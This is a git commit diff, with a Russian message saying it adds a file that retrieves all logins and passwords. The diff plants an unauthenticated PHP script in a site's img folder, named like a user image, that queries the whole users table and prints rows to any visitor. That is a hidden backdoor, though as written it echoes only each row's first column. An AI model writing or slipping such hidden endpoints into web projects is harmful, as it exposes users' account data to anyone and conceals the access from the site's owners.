342c99eea52eba868c3ebf702742ef9150b9dca3
Alex3455755 <alexeigyll@gmail.com>
2026-03-06 13:52:07 +0500

    добавил файл который получает все логины и пароли

---
+++ security.permaviat.ru/img/user_34.php
@@ -0,0 +1,13 @@
+<?php
+
+include("../settings/connect_datebase.php");
+
+
+$database_query = $mysqli->query("SELECT * FROM `users`");
+
+echo "Юзеры в БД \n";
+    while($row = $database_query->fetch_array()) {
+        echo "- " . $row[0] . "\n";
+    }
+
+?>
